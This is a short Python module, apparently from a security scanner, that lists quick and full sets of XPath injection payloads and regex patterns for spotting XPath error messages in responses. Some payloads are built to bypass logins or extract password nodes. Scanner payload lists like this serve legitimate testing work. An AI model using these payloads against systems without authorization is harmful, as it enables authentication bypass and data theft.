"""Payloads para detección de XPath Injection."""

QUICK_PAYLOADS = [
    "' or '1'='1",
    "' or '1'='1' or 'x'='y",
    "'] | //node | a['1'='1",
    "' or 1=1 or 'a'='b",
    "x' or name()='username' or 'x'='y",
    "' or count(//user)>0 or 'a'='b",
    "1' or '1",
    "' or position()=1 or 'a'='b",
]

FULL_PAYLOADS = [
    "' or //user/password[.!='' or '1'='1",
    "'] | //password | a['x'='x",
    "' or //user[name/text()='admin' or '1'='1",
    "x' or 'x'='x",
    "' or 1 or 'a'='b",
    "' or boolean(//user) or 'a'='b",
    "' or string-length(//user/name)>0 or 'a'='b",
    "admin' or '1' or '",
    "' or count(//*)>0 or 'a'='b",
    "' or //element or 'a'='b",
]

# Patrones que indican XPath Injection en la respuesta
DETECTION_PATTERNS = [
    "invalid predicate",
    r"syntax error.*xpath",
    r"xpath.*error",
    r"xpath.*exception",
    "invalid expression",
    r"invalid argument.*xpath",
    "xmlxpathcompiledexpr",
    "xpathexception",
    "java.lang.string cannot be cast",
    "javax.xml.xpath",
    "system.xml.xpath",
    "simplexml_load",
    "unterminated string",
]
